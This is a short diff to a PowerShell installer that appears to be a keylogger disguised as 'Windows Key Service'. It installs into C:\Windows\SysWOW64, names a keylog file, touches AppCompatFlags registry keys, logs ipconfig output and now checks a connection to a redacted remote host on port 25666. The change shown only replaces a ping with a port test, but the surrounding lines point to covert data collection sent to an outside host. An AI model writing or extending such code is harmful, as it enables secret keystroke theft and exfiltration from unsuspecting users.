@@ -3,6 +3,7 @@ $App = "Windows Key Service"
 $AppExe = "$App.exe"
 $DestDir = "C:\Windows\SysWOW64\"
 $DestIp = "***REMOVED***"
+$DestPort = 25666
 $KeyLogName = "k"
 $InstallPath = "$DestDir$AppExe"
 $AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
@@ -19,7 +20,7 @@ function Install()
 
     ipconfig /all | Out-File -Append -FilePath $LogFile
 
-    $IsConnected = Test-Connection -Quiet $DestIp
+    $IsConnected = Test-NetConnection $DestIp -Port $DestPort -InformationLevel Quiet
     if ($IsConnected)
     {
         try {
